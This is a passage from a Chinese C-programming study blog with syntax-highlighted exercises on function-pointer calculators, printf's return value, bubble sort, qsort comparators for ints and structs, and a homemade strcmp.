class="type">int</span> <span class="title function_">Add</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line"> &#125; </span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Sub</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> x - y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Mul</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> x * y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">div</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (x / y);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1.add\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;2.sub\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;3.mul\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;4.div\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0.exit\n&quot;</span>);</span><br><span class="line"> &#125; </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> (*pf1)(<span class="type">int</span>, <span class="type">int</span>) = Add;</span><br><span class="line">    <span class="type">int</span> (*pf2)(<span class="type">int</span>, <span class="type">int</span>) = Sub;</span><br><span class="line">    <span class="comment">// pfArr[2] + int(*)(int, int)  </span></span><br><span class="line">    <span class="type">int</span> (*pfArr[<span class="number">2</span>])(<span class="type">int</span>, <span class="type">int</span>) = &#123;Add, Sub&#125;;</span><br><span class="line">    <span class="comment">//*pfArr 就是函数指针数组 </span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//计算器-计算整型变量的加、减、乘、除。 </span></span><br><span class="line">    <span class="type">int</span> input = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        menu();</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> y = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;请选择：&gt;&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line">        <span class="keyword">switch</span> (input)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;请输入俩个操作数&gt;:&quot;</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;x, &amp;y);</span><br><span class="line">                ret = Add(x, y);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;请输入俩个操作数&gt;:&quot;</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;x, &amp;y);</span><br><span class="line">                ret = Sub(x, y);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;请输入俩个操作数&gt;:&quot;</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;x, &amp;y);</span><br><span class="line">                ret = Mul(x, y);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;请输入俩个操作数&gt;:&quot;</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;x, &amp;y);</span><br><span class="line">                ret = div(x, y);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;退出程序&quot;</span>);</span><br><span class="line">                input = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;选择错误，请重新选择&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ret = %d\n&quot;</span>, ret);</span><br><span class="line">    &#125; <span class="keyword">while</span> (input);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法二</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//计算器-计算整型变量的加、减、乘、除。</span></span><br><span class="line">    <span class="comment">//a&amp;b a^b a|b a&gt;&gt;b a&lt;&lt;b a&gt;b </span></span><br><span class="line">    <span class="type">int</span> input = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        menu();</span><br><span class="line">        <span class="type">int</span> (*pfArr[<span class="number">5</span>])(<span class="type">int</span>, <span class="type">int</span>) = &#123;<span class="literal">NULL</span>, Add, Sub, Mul, div&#125;;</span><br><span class="line">        <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> y = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;请选择：&gt;\n&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line">        <span class="keyword">if</span> (input &gt;= <span class="number">1</span> &amp;&amp; input &lt;= <span class="number">4</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入2个操作数&gt;:&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;x, &amp;y); </span><br><span class="line">            ret = (pfArr[input])(x, y);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ret = %d\n&quot;</span>, ret);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (input == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;退出\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;选择错误\n&quot;</span>);</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125; <span class="keyword">while</span> (input);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>描述<br>KiKi写了一个输出“Hello world!”的程序，BoBo老师告诉他printf函数有返回值，你能帮他写个程序输出printf(“Hello world!”)的返回值吗？<br>输入描述：<br>无<br>输出描述：<br>包括两行：<br>第一行为“Hello world!”<br>第二行为printf(“Hello world!”)调用后的返回值。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//printf函数源码</span></span><br><span class="line"><span class="comment">//int __cdecl printf(const char * __restrict__ _Format,...);</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="built_in">printf</span>(<span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,  a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BC15-大小写转换"><a href="#BC15-大小写转换" class="headerlink" title="BC15 大小写转换"></a>BC15 大小写转换</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> ch = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((ch = getchar()) != EOF) &#123; </span><br><span class="line">    <span class="comment">//EOF意为-1。本语句即只要输入项是字符即可打印</span></span><br><span class="line">        getchar();</span><br><span class="line">        <span class="built_in">putchar</span>(ch + <span class="number">32</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="指针进阶6"><a href="#指针进阶6" class="headerlink" title="指针进阶6"></a>指针进阶6</h3><p>复习冒泡排序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bubble_sort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> sz)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; sz; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; sz - <span class="number">1</span> - i; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>])&#123;</span><br><span class="line">                <span class="type">int</span> tmp = arr[j + <span class="number">1</span>];</span><br><span class="line">                arr[j + <span class="number">1</span>] = arr[j];</span><br><span class="line">                arr[j] = tmp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;   </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> sz)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; sz; i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> arr[<span class="number">10</span>] = &#123;<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> sz = <span class="keyword">sizeof</span>(arr) / <span class="keyword">sizeof</span>(arr[<span class="number">0</span>]);</span><br><span class="line">    bubble_sort(arr, sz);</span><br><span class="line">    print(arr, sz); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125; </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/12/rOnPdWCTq8RmgYL.png" alt="image.png"></p><h4 id="qsort-x2F-x2F-快速排序"><a href="#qsort-x2F-x2F-快速排序" class="headerlink" title="qsort();&#x2F;&#x2F;快速排序"></a>qsort();&#x2F;&#x2F;快速排序</h4><p>整型数据，字符串数据，结构体数据都可以排</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">qsort</span><span class="params">(<span class="type">void</span> *base,<span class="comment">//base 中存放的是待排序数据中第一个对象的地址 </span></span></span><br><span class="line"><span class="params">                 <span class="type">size_t</span> nitems, <span class="comment">//num 是待排序数据的元素个数</span></span></span><br><span class="line"><span class="params">                 <span class="type">size_t</span> size, <span class="comment">//size 排序中一个元素的大小 </span></span></span><br><span class="line"><span class="params">                 <span class="type">int</span> (*compar)(<span class="type">const</span> <span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span>*) <span class="comment">//指向函数的指针，用于确定排序的顺序（需要用户自定义一个比较函数） </span></span></span><br><span class="line"><span class="params">                 )</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="comment">//因为void不知道什么类型，所以要先强制转换类型，而qsort对比较函数只要求和0的关系</span></span><br><span class="line"><span class="comment">//所以直接return 差值即可 </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">cmp_int</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* e1, <span class="type">const</span> <span class="type">void</span>* e2)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">int</span>*)e1 - *(<span class="type">int</span>*)e2;</span><br><span class="line"> &#125; </span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> sz)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; sz; i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> arr[<span class="number">10</span>] = &#123;<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> sz = <span class="keyword">sizeof</span>(arr) / <span class="keyword">sizeof</span>(arr[<span class="number">0</span>]);</span><br><span class="line">    qsort(arr, sz, <span class="keyword">sizeof</span>(arr[<span class="number">0</span>]), cmp_int);</span><br><span class="line">    print(arr, sz); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/12/PoDyjkpAuZ8CMmf.png" alt="image.png"></p><h4 id="qsort函数排序结构体"><a href="#qsort函数排序结构体" class="headerlink" title="qsort函数排序结构体"></a>qsort函数排序结构体</h4><p>1.按年龄排序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stu</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">20</span>];</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">&#125;; </span><br><span class="line"><span class="type">int</span> <span class="title function_">sort_by_age</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* e1, <span class="type">const</span> <span class="type">void</span>* e2)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">struct</span> Stu*)e1)-&gt;age - ((<span class="keyword">struct</span> Stu*)e2)-&gt;age;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(<span class="keyword">struct</span> Stu s[], <span class="type">int</span> sz)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Stu</span> *<span class="title">p</span>;</span></span><br><span class="line">    p = s;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; sz; i++)</span><br><span class="line">    &#123;   </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Stu%d\n&quot;</span>,i);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;name:%s\n&quot;</span>, p-&gt;name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;age:%d\n&quot;</span>, p-&gt;age);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        p++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test2</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//使用qsort排序结构体数据 </span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Stu</span> <span class="title">s</span>[] =</span> &#123;</span><br><span class="line">        &#123;<span class="string">&quot;zhangsan&quot;</span>, <span class="number">30</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;liso&quot;</span>, <span class="number">35</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;wangwu&quot;</span>, <span class="number">20</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> sz = <span class="keyword">sizeof</span>(s) / <span class="keyword">sizeof</span>(s[<span class="number">0</span>]);</span><br><span class="line">    <span class="comment">//按年龄排序</span></span><br><span class="line">    </span><br><span class="line">    qsort(s, sz, <span class="keyword">sizeof</span>(s[<span class="number">0</span>]), sort_by_age);</span><br><span class="line">    print(s, sz);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    test2();</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/12/I8lagQoBthpbJdj.png" alt="image.png"></p><p>2.按名字排序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stu</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">20</span>];</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">&#125;; </span><br><span class="line"><span class="type">int</span> <span class="title function_">sort_by_name</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* e1, <span class="type">const</span> <span class="type">void</span>* e2)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strcmp</span>(((<span class="keyword">struct</span> Stu*)e1)-&gt;name, ((<span class="keyword">struct</span> Stu*)e2)-&gt;name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(<span class="keyword">struct</span> Stu s[], <span class="type">int</span> sz)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Stu</span> *<span class="title">p</span>;</span></span><br><span class="line">    p = s;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; sz; i++)</span><br><span class="line">    &#123;   </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Stu%d\n&quot;</span>,i);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;name:%s\n&quot;</span>, p-&gt;name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;age:%d\n&quot;</span>, p-&gt;age);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        p++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test2</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//使用qsort排序结构体数据 </span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Stu</span> <span class="title">s</span>[] =</span> &#123;</span><br><span class="line">        &#123;<span class="string">&quot;zhangsan&quot;</span>, <span class="number">30</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;liso&quot;</span>, <span class="number">35</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;wangwu&quot;</span>, <span class="number">20</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> sz = <span class="keyword">sizeof</span>(s) / <span class="keyword">sizeof</span>(s[<span class="number">0</span>]);</span><br><span class="line">    <span class="comment">//按名字排序</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;突然想看下s中元素的大小%d\n&quot;</span>,<span class="keyword">sizeof</span>(s[<span class="number">0</span>]));</span><br><span class="line">    qsort(s, sz, <span class="keyword">sizeof</span>(s[<span class="number">0</span>]), sort_by_name);</span><br><span class="line">    print(s, sz);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    test2();</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure><p><em>一个char 8bit&#x3D;1byte 一个int 4byte 所以是24</em><br><img src="https://s2.loli.net/2023/03/12/LwpS6mz3bsEPlid.png" alt="image.png"></p><p>3.突然想看下string.h中的strcmp源码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">strcmp</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="type">const</span> <span class="type">char</span> * src,</span></span><br><span class="line"><span class="params">        <span class="type">const</span> <span class="type">char</span> * dst</span></span><br><span class="line"><span class="params">        )</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> ret = <span class="number">0</span> ;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((ret = *(<span class="type">unsigned</span> <span class="type">char</span> *)src - *(<span class="type">unsigned</span> <span class="type">char</span> *)dst) == <span class="number">0</span> &amp;&amp; *dst)</span><br><span class="line">                &#123;</span><br><span class="line">                ++src, ++dst;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ((-ret) &lt; <span class="number">0</span>) - (ret &lt; <span class="number">0</span>); <span class="comment">// (if positive) - (if negative) generates branchless code</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看不懂，试着自己实现一个</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">str_cmp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str1, <span class="type">const</span> <span class="type">char</span>* str2)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span> (*str1 == *str2) &#123;</span><br><span class="line">        str1++;</span><br><span class="line">        str2++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> ret = *str1 - *str2;</span><br><span class="line">    <span class="keyword">return</span> ret; </span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> str1[] = <span class="string">&quot;abcde&quot;</span>;</span><br><span class="line">    <span class="type">char</span> str2[] = <span class="string">&quot;bca&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,str_cmp(str1, str2));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/12/U2tR96KOhZ5X7YP.png" alt="image.png"></p><h2 id="模仿qsort实现冒泡排序"><a href="#模仿qsort实现冒泡排序" class="headerlink" title="模仿qsort实现冒泡排序"></a>模仿qsort实现冒泡排序</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Swap</span><span class="params">(<span class="type">char</span>* buf1, <span class="type">char</span>* buf2, <span class="type">int</span> width)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; width; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> tmp = *buf1;</span><br><span class="line">        *buf1 = *buf2;</span><br><span class="line">        *buf2 =tmp;</span><br><span class="line">        buf1++;</span><br><span class="line">        buf2++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//模仿qsort实验一个冒泡排序的通用算法 </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bubble_sort</span><span class="params">(<span class="type">void</span>* base,</span></span><br><span class="line"><span class="params">                <span class="type">int</span> sz,<span class="comment">//元素个数 </span></span></span><br><span class="line"><span class="params">                <span class="type">int</span> width, <span class="comment">//元素大小（几个字节） </span></span></span><br><span class="line"><span class="params">                <span class="type">int</span> (*cmp)(<span class="type">const</span> <span class="type">void</span>* e1, <span class="type">const</span> <span class="type">void</span>* e2)</span></span><br><span class="line"><span class="params">                )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//sz个元素进行sz-1趟 </span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; sz <span class="number">-1</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//一趟排序 </span></span><br><span class="line">        <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; sz - <span class="number">1</span> - i; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//两个元素比较 </span></span><br><span class="line">            <span class="comment">//arr[j] arr[j+1]</span></span><br><span class="line">            <span class="keyword">if</span> (cmp((<span class="type">char</span>*)base + j * width, (<span class="type">char</span>*)base + (j + <span class="number">1</span>) * width) &gt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//交换 </span></span><br><span class="line">                Swap((<span class="type">char</span>*)base + j * width, (<span class="type">char</span>*)base + (j + <span class="number">1</span>) * width, width);</span><br><span class="line">            &#125;</span><br><span class="line">         &#125; </span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">cmp_int</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* e1, <span class="type">const</span> <span class="type">void</span>* e2)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">int</span>*)e1 - *(<span class="type">int</span>*)e2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_arr</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> sz)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; sz; i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title 